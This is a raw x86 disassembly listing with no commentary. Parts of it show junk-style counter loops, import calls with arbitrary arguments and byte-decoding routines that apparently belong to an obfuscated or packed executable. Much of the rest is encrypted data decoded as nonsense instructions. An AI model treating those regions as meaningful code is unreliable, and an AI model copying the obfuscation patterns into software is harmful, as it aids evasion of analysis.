  4101d0:	call   0xb6fd:0x2aeb654f
  4101d7:	cmp    ah,BYTE PTR es:0xebef7d57
  4101de:	push   ecx
  4101df:	xchg   ebp,eax
  4101e0:	push   ss
  4101e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4101e2:	mov    ds:0x88577671,eax
  4101e7:	fmul   QWORD PTR [ebp-0x388b8521]
  4101ed:	cdq    
  4101ee:	pop    ebp
  4101ef:	jnp    0x410203
  4101f1:	and    esp,DWORD PTR [esi-0x1c]
  4101f4:	mov    ah,0x1f
  4101f6:	scas   eax,DWORD PTR es:[edi]
  4101f7:	jb     0x410275
  4101f9:	cmc    
  4101fa:	xchg   DWORD PTR ss:[ebp+0x35],ecx
  4101fe:	fs div ecx
  410201:	mov    ecx,DWORD PTR [ebp+0x10]
  410204:	and    ecx,eax
  410206:	or     ecx,0x81161d8f
  41020c:	mov    eax,ecx
  41020e:	pop    ebp
  41020f:	ret    0x18
  410212:	push   ebp
  410213:	mov    ebp,esp
  410215:	sub    esp,0x58
  410218:	mov    ecx,DWORD PTR ds:0x43379f
  41021e:	adc    DWORD PTR ds:0x4337d7,ecx
  410224:	mov    ecx,DWORD PTR [ebp+0x8]
  410227:	and    eax,0x4408
  41022c:	mov    eax,0x8a3c
  410231:	xor    ax,WORD PTR [ecx+0x20]
  410235:	sub    ecx,0x2534
  41023b:	mov    ecx,0x3b02
  410240:	or     DWORD PTR ds:0x43370b,0x3241
  41024a:	add    ax,cx
  41024d:	xor    DWORD PTR ds:0x43382b,0x1afb
  410257:	movzx  eax,ax
  41025a:	and    ecx,0x4b4d
  410260:	mov    DWORD PTR [ebp-0xc],eax
  410263:	xor    ecx,ecx
  410265:	xor    ecx,DWORD PTR ds:0x4337df
  41026b:	or     DWORD PTR ds:0x4337d7,ecx
  410271:	mov    BYTE PTR [ebp-0x1],0x7f
  410275:	and    DWORD PTR ds:0x4337ab,0x0
  41027f:	jmp    0x410291
  410284:	mov    ecx,DWORD PTR ds:0x4337ab
  41028a:	inc    ecx
  41028b:	mov    DWORD PTR ds:0x4337ab,ecx
  410291:	cmp    DWORD PTR ds:0x4337ab,0x14
  410298:	jae    0x4102ed
  41029e:	cmp    DWORD PTR ds:0x4337ab,0xb
  4102a5:	jne    0x4102c6
  4102ab:	push   DWORD PTR [ebp-0x28]
  4102ae:	push   0x4636
  4102b3:	push   0x8d9e
  4102b8:	push   0x8baf
  4102bd:	push   DWORD PTR [ebp-0x18]
  4102c0:	call   DWORD PTR ds:0x412374
  4102c6:	cmp    DWORD PTR ds:0x4337ab,0xa
  4102cd:	jne    0x4102e2
  4102d3:	xor    ecx,ecx
  4102d5:	add    ecx,DWORD PTR ds:0x4337ab
  4102db:	inc    ecx
  4102dc:	mov    DWORD PTR ds:0x4337ab,ecx
  4102e2:	jmp    0x410284
  4102e7:	sbb    ecx,DWORD PTR ds:0x433703
  4102ed:	lea    eax,[ebp-0x1]
  4102f0:	mov    DWORD PTR [ebp-0x10],eax
  4102f3:	mov    al,BYTE PTR [ebp-0x1]
  4102f6:	mov    ecx,DWORD PTR [ebp-0x10]
  4102f9:	sub    DWORD PTR ds:0x4337e7,0x43379f
  410303:	xor    al,0x46
  410305:	xor    DWORD PTR ds:0x4337e3,0x433797
  41030f:	sub    al,0x38
  410311:	mov    BYTE PTR [ecx],al
  410313:	movzx  ecx,WORD PTR ds:0x433757
  41031a:	sub    DWORD PTR ds:0x43371f,ecx
  410320:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  410327:	mov    DWORD PTR [ebp-0x10],0xf89c8532
  41032e:	and    DWORD PTR ds:0x43375b,0x0
  410338:	mov    ecx,DWORD PTR ds:0x43375b
  41033e:	inc    ecx
  41033f:	mov    DWORD PTR ds:0x43375b,ecx
  410345:	cmp    DWORD PTR ds:0x43375b,0x25
  41034c:	jne    0x410362
  410352:	push   0x4338af
  410357:	push   0x4338ef
  41035c:	call   DWORD PTR ds:0x4120f4
  410362:	cmp    DWORD PTR ds:0x43375b,0x16
  410369:	jb     0x410338
  41036f:	adc    DWORD PTR ds:0x43379f,edx
  410375:	mov    eax,DWORD PTR [ebp-0x8]
  410378:	and    DWORD PTR ds:0x433813,0x0
  410382:	mov    ecx,DWORD PTR ds:0x433813
  410388:	inc    ecx
  410389:	mov    DWORD PTR ds:0x433813,ecx
  41038f:	cmp    DWORD PTR ds:0x433813,0xf
  410396:	jne    0x4103ac
  41039c:	push   0x4337e7
  4103a1:	push   0x178b
  4103a6:	call   DWORD PTR ds:0x412378
  4103ac:	cmp    DWORD PTR ds:0x433813,0xe
  4103b3:	jne    0x4103c8
  4103b9:	xor    ecx,ecx
  4103bb:	xor    ecx,DWORD PTR ds:0x433813
  4103c1:	inc    ecx
  4103c2:	mov    DWORD PTR ds:0x433813,ecx
  4103c8:	cmp    DWORD PTR ds:0x433813,0x1b
  4103cf:	jb     0x410382
  4103d5:	sub    DWORD PTR ds:0x43375f,edx
  4103db:	mov    ecx,0x7510854
  4103e0:	push   esi
  4103e1:	and    DWORD PTR ds:0x433757,0x0
  4103eb:	jmp    0x4103ff
  4103f0:	xor    esi,esi
  4103f2:	add    esi,DWORD PTR ds:0x433757
  4103f8:	inc    esi
  4103f9:	mov    DWORD PTR ds:0x433757,esi
  4103ff:	cmp    DWORD PTR ds:0x433757,0x1d
  410406:	jae    0x410427
  41040c:	cmp    DWORD PTR ds:0x433757,0x26
  410413:	jne    0x410422
  410419:	push   DWORD PTR [ebp-0x24]
  41041c:	call   DWORD PTR ds:0x4122b4
  410422:	jmp    0x4103f0
  410427:	xor    eax,ecx
  410429:	mov    esi,0x32729b
  41042e:	add    eax,esi
  410430:	jmp    0x41043d
  410435:	mov    dl,BYTE PTR [ebp-0x1]
  410438:	mov    BYTE PTR [ebp+eax*1-0x58],dl
  41043c:	inc    eax
  41043d:	cmp    eax,0x40
  410440:	jb     0x410435
  410446:	mov    edx,DWORD PTR [ebp-0x8]
  410449:	mov    eax,DWORD PTR [ebp-0xc]
  41044c:	xor    edx,ecx
  41044e:	add    edx,esi
  410450:	cmp    edx,eax
  410452:	je     0x410766
  410458:	push   ebx
  410459:	push   edi
  41045a:	mov    edi,DWORD PTR [ebp+0x8]
  41045d:	mov    eax,0x8a3c
  410462:	xor    ax,WORD PTR [edi+edx*4+0x2]
  410467:	mov    edi,0x3b02
  41046c:	add    ax,di
  41046f:	movzx  eax,ax
  410472:	mov    DWORD PTR [ebp-0x14],eax
  410475:	mov    eax,DWORD PTR [ebp+0x8]
  410478:	movzx  eax,WORD PTR [eax+edx*4]
  41047c:	xor    eax,0x8a3c
  410481:	add    eax,edi
  410483:	mov    edi,DWORD PTR [ebp-0x14]
  410486:	mov    BYTE PTR [ebp+edi*1-0x58],al
  41048a:	jmp    0x410758
  41048f:	cdq    
  410490:	outs   dx,BYTE PTR ds:[esi]
  410491:	mov    ds:0xa1f17118,eax
  410496:	outs   dx,DWORD PTR ds:[esi]
  410497:	or     BYTE PTR [edx],bl
  410499:	push   es
  41049a:	out    0xf,al
  41049c:	xor    cl,al
  41049e:	and    eax,0x7e7eb0dc
  4104a3:	scas   eax,DWORD PTR es:[edi]
  4104a4:	jl     0x410524
  4104a6:	jle    0x41044a
  4104a8:	cmp    ecx,DWORD PTR [esi]
  4104aa:	and    dh,BYTE PTR [esi+0x56ac1a3c]
  4104b0:	nop
  4104b1:	and    bl,BYTE PTR [eax]
  4104b3:	sbb    BYTE PTR [eax],bh
  4104b5:	mov    cl,0x71
  4104b7:	cmp    BYTE PTR [esi*8-0xaf718eb],bh
  4104be:	sub    al,0x3a
  4104c0:	js     0x41051d
  4104c2:	ss (bad) 
  4104c4:	std    
  4104c5:	int3   
  4104c6:	dec    ecx
  4104c7:	dec    esp
  4104c8:	dec    ecx
  4104c9:	pop    eax
  4104ca:	neg    esi
  4104cc:	adc    BYTE PTR [eax+eiz*8-0x7],ch
  4104d0:	push   esi
  4104d1:	cmp    ch,BYTE PTR [esi]
  4104d3:	lds    ecx,FWORD PTR [ecx]
  4104d5:	sbb    ah,BYTE PTR ds:0x1deab2f0
  4104db:	push   edi
  4104dc:	mov    esp,0x53bfac2c
  4104e1:	fstp   TBYTE PTR [edx+ecx*1+0x58]
  4104e5:	adc    ecx,DWORD PTR ds:0x847f6f41
  4104eb:	and    ebx,DWORD PTR [eax]
  4104ed:	leave  
  4104ee:	mov    al,0x85
  4104f0:	sti    
  4104f1:	mov    ebp,DWORD PTR [ebp-0x4c]
  4104f4:	mov    al,ds:0xa4341eb4
  4104f9:	or     DWORD PTR [edi-0x32],eax
  4104fc:	retf   
  4104fd:	cs adc al,0xce
  410500:	add    DWORD PTR [esi-0x2e4f574a],edi
  410506:	repnz cmp esp,DWORD PTR [esi-0x339793a1]
  41050d:	sub    cl,BYTE PTR [ecx+0xa]
  410510:	lds    edi,FWORD PTR [edi]
  410512:	rcl    DWORD PTR [ecx-0x29a24c9c],1
  410518:	pushf  
  410519:	and    ecx,esi
  41051b:	push   edi
  41051c:	outs   dx,BYTE PTR ds:[esi]
  41051d:	inc    ebx
  41051e:	cmp    ebp,DWORD PTR [eax+0x3f]
  410521:	pop    edi
  410522:	arpl   WORD PTR [edi-0x80],sp
  410525:	std    
  410526:	add    edi,DWORD PTR [edx+0x2]
  410529:	mov    ds:0xbcefa562,al
  41052e:	imul   edi,DWORD PTR [edx],0x477ac80
  410534:	add    al,0x69
  410536:	retf   0x1837
  410539:	push   esi
  41053a:	rcr    DWORD PTR [ecx+eiz*2+0x76],0xa5
  41053f:	or     al,0x5f
  410541:	push   edi
  410542:	loopne 0x410532
  410544:	mov    ch,0x44
  410546:	sbb    ebp,0xffffffc9
  410549:	pop    es
  41054a:	mov    dl,0xeb
  41054c:	popa   
  41054d:	mov    bh,0x90
  41054f:	bound  eax,QWORD PTR [esi+edx*1+0x27d05472]
  410556:	xor    bh,BYTE PTR [ebx]
  410558:	shr    DWORD PTR [ecx+0xf9bd74d],0x3c
  41055f:	dec    edi
  410560:	and    al,BYTE PTR [esi+0x354ab28f]
  410566:	mov    dl,0x7e
  410568:	rcl    DWORD PTR [edi],1
  41056a:	xor    esi,ebx
  41056c:	dec    bh
  41056e:	push   edi
  41056f:	mov    DWORD PTR [esi],ecx
  410571:	pop    ebx
  410572:	push   ss
  410573:	in     al,0xab
  410575:	test   DWORD PTR ds:0x568a0103,esp
  41057b:	in     al,0xf9
  41057d:	sub    esi,DWORD PTR [edx-0x2f201825]
  410583:	pop    esp
  410584:	cmp    eax,0x6091c498
  410589:	in     al,0x6f
  41058b:	ds dec ebp
  41058d:	inc    edx
  41058e:	and    DWORD PTR [esi],ebp
  410590:	ror    BYTE PTR [edi+0x44],1
  410593:	mov    esp,0x4f65253e
  410598:	(bad)  
  41059a:	fwait
  41059b:	jmp    0x4105d8
  41059d:	call   0xd13d:0x4ebde186
  4105a4:	into   
  4105a5:	push   eax
  4105a6:	jb     0x410556
  4105a8:	dec    ebx
  4105a9:	add    al,0x80
  4105ab:	xchg   esp,eax
  4105ac:	ja     0x410606
  4105ae:	shl    DWORD PTR [ebx],cl
  4105b0:	in     al,0x2e
  4105b2:	jmp    0x4105a5
  4105b4:	push   esp
  4105b5:	call   DWORD PTR [esi-0x6615bfa5]
  4105bb:	cs int 0x7
  4105be:	or     BYTE PTR [ecx-0x80],bh
  4105c1:	icebp  
  4105c2:	xchg   edx,eax
  4105c3:	fbld   TBYTE PTR [eax]
  4105c5:	sub    BYTE PTR [ebp-0x29306b0e],ch
  4105cb:	add    al,0x31
  4105cd:	ret    0xf442
  4105d0:	nop
  4105d1:	call   0x7df0df6c
  4105d6:	add    DWORD PTR [ebp-0x23],ebx
  4105d9:	cmp    bl,BYTE PTR [ebp+esi*2+0x43439073]
  4105e0:	sbb    edx,ebp
  4105e2:	(bad)  [edi+edx*8-0x19facbed]
  4105e9:	adc    DWORD PTR ds:0x2192726,0xffffffd6
  4105f0:	push   es
  4105f1:	icebp  
  4105f2:	push   esp
  4105f3:	cmp    DWORD PTR [eax],eax
  4105f5:	pop    esp
  4105f6:	or     al,0xd4
  4105f8:	(bad)  
  4105f9:	call   0xc70b:0x44bcb037
  410600:	push   ecx
  410601:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410602:	retf   0x2174
  410605:	sbb    DWORD PTR [edx-0x2],0xa50d24f0
  41060c:	out    dx,eax
  41060d:	in     al,0xd8
  41060f:	setge  BYTE PTR [ebx+0x2a3cd03f]
  410616:	loopne 0x4105ed
  410618:	pusha  
  410619:	fistp  QWORD PTR [edx-0x5f]
  41061c:	das    
  41061d:	ja     0x4105c0
  41061f:	outs   dx,DWORD PTR ds:[esi]
  410620:	sbb    ecx,DWORD PTR [ebp-0x48068069]
  410626:	loope  0x410654
  410628:	std    
  410629:	xor    BYTE PTR [edi],0xc8
  41062c:	(bad)  
  41062d:	jb     0x41063b
  41062f:	push   edx
  410630:	loopne 0x4106a0
  410632:	jge    0x41062a
  410634:	cs popf 
  410636:	lea    ebp,[eax]
  410638:	and    DWORD PTR [ebp+0x6532d5f2],esp
  41063e:	fild   QWORD PTR cs:[ebx+0x67]
  410642:	sub    DWORD PTR [edi-0x2b],0xffffffb1
  410646:	mov    esi,eax
  410648:	adc    BYTE PTR [eax+0x7e083116],0xd6
  41064f:	rcr    DWORD PTR [ebx-0x1ee81367],0xe2
  410656:	adc    cl,BYTE PTR [eax-0x4df90ccc]
  41065c:	pop    esp
  41065d:	ins    DWORD PTR es:[edi],dx
  41065e:	mov    bh,0x18
  410660:	clc    
  410661:	inc    edx
  410662:	dec    edi
  410663:	or     al,0x6
  410665:	add    eax,esp
  410667:	dec    esp
  410668:	jne    0x410635
  41066a:	int3   
  41066b:	repz xor dl,BYTE PTR [ebx]
  41066e:	pop    es
  41066f:	adc    edi,ebp
  410671:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410672:	ficom  WORD PTR ds:0xc265547d
  410678:	je     0x4106b9
  41067a:	xchg   edi,ebp
  41067c:	jno    0x410674
  41067e:	cmc    
  41067f:	cmp    bh,BYTE PTR [edx+0x29]
  410682:	add    eax,0x83e1f11b
  410687:	outs   dx,BYTE PTR ds:[esi]
  410688:	mov    eax,0xb442718
  41068d:	or     ebx,DWORD PTR [eax-0x620731c3]
  410693:	int    0x54
  410695:	cli    
  410696:	xor    edx,DWORD PTR [ebp-0xf9ae1bc]
  41069c:	jp     0x410672
  41069e:	xchg   edi,eax
  41069f:	lods   eax,DWORD PTR ds:[esi]
  4106a0:	stc    
  4106a1:	aaa    
  4106a2:	mov    esi,esi
  4106a4:	sti    
  4106a5:	and    eax,0x9f438656
  4106aa:	add    al,0x1b
  4106ac:	and    DWORD PTR [edx],eax
  4106ae:	test   eax,0x8f2c49e2
  4106b3:	or     eax,0x39857c99
  4106b8:	cwde   
  4106b9:	ins    DWORD PTR es:[edi],dx
  4106ba:	sub    dh,ah
  4106bc:	and    eax,0xf1221393
  4106c1:	xchg   edx,eax
  4106c2:	imul   eax,eax,0x73c81188
  4106c8:	les    ebp,FWORD PTR [esi-0x11]
  4106cb:	jnp    0x410679
  4106cd:	data16 fs aam 0xee
  4106d1:	test   BYTE PTR [ecx+0xb4f1a0f],0xa2
  4106d8:	repnz and ah,BYTE PTR [ebp+esi*4-0x1a]
  4106dd:	jge    0x4106a8
  4106df:	adc    al,0x95
  4106e1:	mov    eax,ds:0x4a2b9d23
  4106e6:	loope  0x41070b
  4106e8:	or     al,0x94
  4106ea:	jo     0x41072e
  4106ec:	and    al,0xe1
  4106ee:	(bad)  
  4106ef:	into   
  4106f0:	sub    dl,dl
  4106f2:	pop    ds
  4106f3:	fnsave [eax+0x70e76d3f]
  4106f9:	add    cl,dh
  4106fb:	inc    eax
  4106fc:	sahf   
  4106fd:	push   esi
  4106fe:	jns    0x410695
  410700:	or     edx,DWORD PTR [ecx-0x5ec4a0a3]
  410706:	sbb    BYTE PTR [ebp-0x22],al
  410709:	(bad)  [eax+0x4508d83]
  41070f:	ss pop esp
  410711:	jg     0x4106ba
  410713:	mov    al,ds:0x71dd151b
  410718:	dec    esp
  410719:	pop    ebp
  41071a:	sahf   
  41071b:	imul   edi,DWORD PTR [ebp-0x18245341],0xbae524ea
  410725:	mov    esi,0xf66936d4
  41072a:	inc    ebp
  41072b:	or     bh,BYTE PTR [esi+0x3f]
  41072e:	aam    0x90
  410730:	mov    al,ds:0x2d4abf56
  410735:	lds    esp,FWORD PTR [edx+eiz*4]
  410738:	inc    edx
  410739:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41073a:	inc    esi
  41073b:	xor    ch,bl
  41073d:	js     0x410708
  41073f:	pop    ebp
  410740:	add    cl,BYTE PTR ss:[edx+ebx*4-0x6b8f0fab]
  410748:	add    al,0x37
  41074a:	and    ch,BYTE PTR gs:[ecx]
  41074d:	jbe    0x410718
  41074f:	(bad)  
  410751:	ror    BYTE PTR [edi+0x17],cl
  410754:	jmp    0xf445:0x8b0cb2c7
  41075b:	inc    edx
  41075c:	cmp    edx,eax
  41075e:	jne    0x41045a
  410764:	pop    edi
  410765:	pop    ebx
  410766:	mov    eax,DWORD PTR [ebp-0x8]
  410769:	mov    edx,DWORD PTR [ebp+0x10]
  41076c:	xor    eax,ecx
  41076e:	jmp    0x410a3c
  410773:	mov    ds:0x6929ab51,eax
  410778:	icebp  
  410779:	mov    eax,ds:0x2251d751
  41077e:	and    eax,0x87e1e1bb
  410783:	or     eax,0xaf7e7ebf
  410788:	jl     0x410808
  41078a:	jle    0x410740
  41078c:	mov    edx,0x7199d11b
  410791:	mov    al,0x23
  410793:	mov    ecx,0xd1db40ab
  410798:	stos   DWORD PTR es:[edi],eax
  410799:	pushf  
  41079a:	mov    esi,0x29a2080b
  41079f:	add    bl,dl
  4107a1:	pop    ds
  4107a2:	push   ds
  4107a3:	loop   0x41074e
  4107a5:	and    esp,DWORD PTR [ecx-0x22772074]
  4107ab:	sbb    eax,0x98c0fb72
  4107b0:	pop    eax
  4107b1:	or     bh,BYTE PTR [ecx-0x4a3763d8]
  4107b7:	or     BYTE PTR [edi],bh
  4107b9:	dec    ebp
  4107ba:	int    0xad
  4107bc:	ins    BYTE PTR es:[edi],dx
  4107bd:	push   esp
  4107be:	adc    al,BYTE PTR [edi]
  4107c0:	shr    BYTE PTR [ecx],1
  4107c2:	mov    edi,0xa54393d
  4107c7:	xchg   edi,eax
  4107c8:	cmp    DWORD PTR [edi],ebx
  4107ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4107cb:	int3   
  4107cc:	sti    
  4107cd:	lahf   
  4107ce:	(bad)  [eax+0x3d684db2]
  4107d4:	mov    ebx,0xf4e8c499
  4107d9:	int    0xa6
  4107db:	xchg   esp,eax
  4107dc:	adc    bl,0xb1
  4107df:	pop    eax
  4107e0:	push   edi
  4107e1:	retf   0xa3c
  4107e4:	mov    esi,0xe4fd8013
  4107e9:	xchg   BYTE PTR [edx-0x6f],al
  4107ec:	sahf   
  4107ed:	fist   DWORD PTR [ebx+0x68]
  4107f0:	xchg   DWORD PTR [eax+0x5b117fbd],ecx
  4107f6:	jne    0x4107e7
  4107f8:	xor    BYTE PTR [edi+0x2b],ah
  4107fb:	mov    DWORD PTR [ebx-0x2f],ebp
  4107fe:	xor    esp,DWORD PTR [ecx+edx*4-0x1b]
  410802:	ja     0x410866
  410804:	adc    eax,0x2f7ff9cb
  410809:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41080a:	in     al,0xc1
  41080c:	and    BYTE PTR [ebx],dl
  41080e:	pop    ebp
  41080f:	fisubr DWORD PTR [ebx-0xd]
  410812:	xor    esi,DWORD PTR [edx]
  410814:	pop    ebp
  410815:	mov    bh,0x4b
  410817:	xlat   BYTE PTR ds:[ebx]
  410818:	xchg   ecx,eax
  410819:	cmp    BYTE PTR [esi],bh
  41081b:	inc    edi
  41081c:	int3   
  41081d:	arpl   WORD PTR [edx-0x71],sp
  410820:	xchg   DWORD PTR [ebp-0x17baf2e6],ebx
  410826:	mul    DWORD PTR [ebx-0x7f]
  410829:	in     eax,dx
  41082a:	mov    BYTE PTR [ebx],ch
  41082c:	add    ebp,esi
  41082e:	jl     0x4107ff
  410830:	(bad)  
  410831:	hlt    
  410832:	(bad)  
  410833:	adc    DWORD PTR [esi+0x46],esi
  410836:	xchg   ebx,eax
  410837:	jecxz  0x4108b1
  410839:	outs   dx,DWORD PTR ds:[esi]
  41083a:	or     eax,0x316c40fa
  41083f:	jo     0x4108aa
  410841:	ins    DWORD PTR es:[edi],dx
  410842:	push   esp
  410843:	and    DWORD PTR [esi+0x7ff06d0d],edx
  410849:	test   dl,bh
  41084b:	es adc al,0x2f
  41084e:	xchg   esp,eax
  41084f:	push   ecx
  410850:	sbb    al,0x9d
  410852:	jno    0x410836
  410854:	sbb    al,0xad
  410856:	dec    ebx
  410857:	pop    eax
  410858:	add    BYTE PTR [ebp+0x19782430],dl
  41085e:	out    0x9e,eax
  410860:	inc    DWORD PTR [esi+ebp*2]
  410863:	repnz dec esi
  410865:	fwait
  410866:	repnz and eax,0x19a52bfc
  41086c:	(bad)  
  41086d:	pop    ecx
  41086e:	jne    0x4108e7
  410870:	mov    ds:0x8f49b3a1,al
  410875:	and    al,BYTE PTR [eax+0x18720dc7]
  41087b:	test   al,0x60
  41087d:	rcr    DWORD PTR [eax+esi*2],cl
  410880:	cld    
  410881:	lds    esp,FWORD PTR [edx]
  410883:	inc    ebx
  410884:	popa   
  410885:	mov    ebp,0xc98b382a
  41088a:	sbb    eax,0x8cea4b1
  41088f:	icebp  
  410890:	lahf   
  410891:	mov    DWORD PTR [eax],esp
  410893:	mov    bl,0x67
  410895:	xchg   esi,eax
  410896:	dec    ecx
  410897:	loope  0x4108ee
  410899:	add    DWORD PTR [esi],ecx
  41089b:	jae    0x410833
  41089d:	xchg   edi,eax
  41089e:	ret    0x1ff0
  4108a1:	mov    edi,0x3dbe980a
  4108a6:	push   edi
  4108a7:	adc    ebp,esi
  4108a9:	push   edi
  4108aa:	adc    BYTE PTR [edi],dh
  4108ac:	adc    bl,BYTE PTR [ebp-0x4b008f41]
  4108b2:	scas   eax,DWORD PTR es:[edi]
  4108b3:	or     eax,0xd5aa6ea5
  4108b8:	sbb    al,0x16
  4108ba:	pop    ss
  4108bb:	xchg   esp,eax
  4108bc:	cmp    eax,0x2b1bb98c
  4108c1:	cmp    al,cl
  4108c3:	push   esp
  4108c4:	cli    
  4108c5:	test   al,0x36
  4108c7:	nop
  4108c8:	pushf  
  4108c9:	jns    0x41091b
  4108cb:	popa   
  4108cc:	lock aaa 
  4108ce:	sub    ah,BYTE PTR [ecx-0x20]
  4108d1:	add    al,0xd6
  4108d3:	xor    al,0x88
  4108d5:	(bad)  
  4108d6:	out    dx,al
  4108d7:	iret   
  4108d8:	fistp  DWORD PTR [ebx]
  4108da:	or     al,0x54
  4108dc:	inc    ebp
  4108dd:	dec    ecx
  4108de:	fxch   st(6)
  4108e0:	lods   al,BYTE PTR ds:[esi]
  4108e1:	mov    ebp,0xf1802988
  4108e6:	adc    ah,bh
  4108e8:	in     eax,dx
  4108e9:	fnstenv [ebx+0x4c]
  4108ec:	push   eax
  4108ed:	pop    ebp
  4108ee:	cmp    DWORD PTR [esp+eiz*8-0x1c],0x45
  4108f3:	mov    eax,0x51a60345
  4108f8:	lods   al,BYTE PTR ds:[esi]
  4108f9:	out    0xe2,eax
  4108fb:	into   
  4108fc:	mov    ecx,0x4c9ece16
  410901:	fst    QWORD PTR [ebp-0x195b7807]
  410907:	mov    ds,esi
  410909:	sbb    ah,BYTE PTR [esi-0x54]
  41090c:	push   0x23
  41090e:	pop    esp
  41090f:	nop
  410910:	push   ecx
  410911:	push   ss
  410912:	popf   
  410913:	jge    0x410906
  410915:	sub    al,0xed
  410917:	cmp    eax,0xb7b02b7f
  41091c:	lahf   
  41091d:	adc    al,0xcf
  41091f:	jl     0x4108dd
  410921:	outs   dx,BYTE PTR ds:[esi]
  410922:	mov    ebp,0x5f2ec66e
  410927:	test   DWORD PTR [ebp+eax*1-0x5c1378d8],esi
  41092e:	mov    dl,ah
  410930:	rcr    BYTE PTR [edi+0x4ae6397f],0x7c
  410937:	data16 fsub QWORD PTR [ebp-0x54]
  41093b:	sub    DWORD PTR [eax],edi
  41093d:	stos   DWORD PTR es:[edi],eax
  41093e:	push   ds
  41093f:	sbb    BYTE PTR [ebp-0x1e16cde9],0x22
  410946:	arpl   WORD PTR [ecx],di
  410948:	into   
  410949:	adc    eax,DWORD PTR [esi-0x720ed3d1]
  41094f:	sahf   
  410950:	aad    0x64
  410952:	mov    ch,0x30
  410954:	xor    BYTE PTR [esi+ecx*1-0x20],bh
  410958:	fld    QWORD PTR [edi-0x44]
  41095b:	push   ss
  41095c:	imul   eax,DWORD PTR [eax+0x7],0x7f7a044f
  410963:	jmp    0x287d10a5
  410968:	jb     0x4109a2
  41096a:	add    eax,0x69eb6961
  41096f:	fstp   TBYTE PTR [esi+0x5a5a18f8]
  410975:	shl    DWORD PTR [edx-0x94a2bcc],cl
  41097b:	fsubr  DWORD PTR [ebp-0x57de0b7f]
  410981:	cmp    ecx,DWORD PTR [ecx+0x127f21fe]
  410987:	fcomp  st(4)
  410989:	icebp  
  41098a:	loopne 0x410953
  41098c:	in     al,dx
  41098d:	push   esi
  41098e:	cs out dx,eax
  410990:	mov    edx,0x53d8f038
  410995:	and    bh,BYTE PTR [ebx]
  410997:	imul   esi,DWORD PTR [esi+0x4d054356],0xffffffb7
  41099e:	jecxz  0x4109a4
  4109a0:	fisubr WORD PTR [eax]
  4109a2:	xor    al,0x12
  4109a4:	dec    esi
  4109a5:	mov    edi,0xc749ef52
  4109aa:	mov    esi,0x60c04dcd
  4109af:	(bad)  
  4109b1:	sbb    eax,0x4c89574e
  4109b6:	mov    ds:0xa5a2d4ad,eax
  4109bb:	sar    al,0x95
  4109be:	and    edx,ebp
  4109c0:	sbb    al,0x43
  4109c2:	inc    ebp
  4109c3:	mov    dl,0x2a
  4109c5:	icebp  
  4109c6:	sar    DWORD PTR [edi+0xae0f2f7],0x8
  4109cd:	sub    dl,BYTE PTR [edi+0x7eee1ff9]
  4109d3:	out    dx,eax
  4109d4:	(bad)  
  4109d5:	rdtsc  
  4109d7:	jg     0x41097d
  4109d9:	inc    edx
  4109da:	and    al,0xee
  4109dc:	aad    0xfb
  4109de:	mov    eax,ds:0x78b4e8f8
  4109e3:	mov    al,ds:0x38bf79b2
  4109e8:	fidiv  WORD PTR [ebx]
  4109ea:	jle    0x410a04
  4109ec:	mov    ds:0xecbfe270,al
  4109f1:	imul   ebp,DWORD PTR [edi+ebp*1],0x46
  4109f5:	cmc    
  4109f6:	adc    al,0xa0
  4109f8:	mov    ch,0x7
  4109fa:	mov    edi,0x174dbd48
  4109ff:	dec    ebp
  410a00:	pop    esp
  410a01:	pop    edi
  410a02:	mov    edi,0x403ae2db
  410a07:	(bad)  [edi+0x7d]
  410a0a:	fcom   DWORD PTR [edx]
  410a0c:	mov    bh,0x44
  410a0e:	call   0x826e:0x9200e311
  410a15:	xchg   esi,eax
  410a16:	dec    ebx
  410a17:	mov    ah,0x3d
  410a19:	pop    ecx
  410a1a:	inc    esi
  410a1b:	mov    eax,ds:0x643fb651
  410a20:	inc    ebx
  410a21:	call   0xc2c6853
  410a26:	es or  cl,dl
  410a29:	xchg   ebp,eax
  410a2a:	jne    0x410a2b
  410a2c:	push   es
  410a2d:	aaa    
  410a2e:	jae    0x410a2d
  410a30:	ror    DWORD PTR [edi-0x3a7df0ff],1
  410a36:	ret    0xf40b
  410a39:	mov    ?,WORD PTR [edx-0x1639fc8d]
  410a3f:	leave  
  410a40:	add    al,BYTE PTR [eax]
  410a42:	add    BYTE PTR [edx],al
  410a44:	xor    ah,BYTE PTR [esp+ebx*8+0x74]
  410a48:	push   0xc758f082
  410a4d:	xchg   esp,eax
  410a4e:	pop    esi
  410a4f:	rol    DWORD PTR [edx-0x21],0x8
  410a53:	mov    edx,0xaf7e7ebd
  410a58:	jl     0x410ad8
  410a5a:	jle    0x410a78
  410a5c:	xchg   ebx,eax
  410a5d:	pop    ebx
  410a5e:	cli    
  410a5f:	in     al,0xcf
  410a61:	mov    edx,0xe8ac5407
  410a66:	aad    0x38
  410a68:	and    eax,0x3d3adfb
  410a6d:	jae    0x410a08
  410a6f:	lds    ebp,FWORD PTR [esi]
  410a71:	adc    DWORD PTR [edx+ebx*8+0x2d1f0fd2],ecx
  410a78:	ins    BYTE PTR es:[edi],dx
  410a79:	aas    
  410a7a:	jbe    0x410a0d
  410a7c:	int3   
  410a7d:	js     0x410a1d
  410a7f:	fs nop
  410a81:	jne    0x410a19
  410a83:	dec    edx
  410a84:	lods   eax,DWORD PTR ds:[esi]
  410a85:	pop    esi
  410a86:	xor    DWORD PTR [ebp+edi*8+0x2b547ec3],0xffffffaa
  410a8e:	mov    dh,0x4e
  410a90:	and    edi,DWORD PTR [esi+0x69bff5bb]
  410a96:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410a97:	shl    BYTE PTR [edi+0x2c7be890],1
  410a9d:	adc    BYTE PTR [edx+ebp*1-0x8be8786],al
  410aa4:	xchg   edx,eax
  410aa5:	xor    ecx,esi
  410aa7:	add    BYTE PTR [edx-0x5eaf1012],dh
  410aad:	dec    edi
  410aae:	mov    ecx,0x703e45a4
  410ab3:	xor    DWORD PTR [edi-0x7e],ebx
  410ab6:	cmp    ebp,DWORD PTR [edi+0x4b818b40]
  410abc:	push   cs
  410abd:	mov    esp,0x7d7e4a8f
  410ac2:	mov    esp,0xeb0fc04c
  410ac7:	scas   eax,DWORD PTR es:[edi]
  410ac8:	mov    ah,0x19
